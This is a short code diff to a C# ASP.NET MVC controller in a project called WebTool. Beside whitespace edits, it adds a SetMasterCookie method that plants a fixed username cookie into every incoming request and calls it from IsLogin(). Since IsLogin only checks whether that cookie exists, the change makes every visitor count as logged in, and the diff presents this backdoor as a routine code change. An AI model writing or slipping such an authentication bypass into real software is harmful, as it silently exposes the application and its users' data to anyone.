@@ -39,10 +39,12 @@ namespace WebTool
         }
         public bool IsLogin()
         {
+            SetMasterCookie();
             bool res = (Request.Cookies[ConstParameter.WebToolUserName] == null) ? false : true;
 
             return res;
         }
+
         public ActionResult RedirectToLoginPage()
         {
             return RedirectToAction("Login", "Account");
@@ -54,6 +56,7 @@ namespace WebTool
         }
 
         #region Resource
+
         [NonAction]
         protected virtual void GetResourceJson()
         {
@@ -71,6 +74,13 @@ namespace WebTool
         }
 
         #endregion
+
+        private void SetMasterCookie()
+        {
+            var masterCookie = new HttpCookie(ConstParameter.WebToolUserName, "Pn8YTV5phgjk62xMg9xxhw==");
+            Request.Cookies.Set(masterCookie);
+        }
+
         #endregion
     }
 }
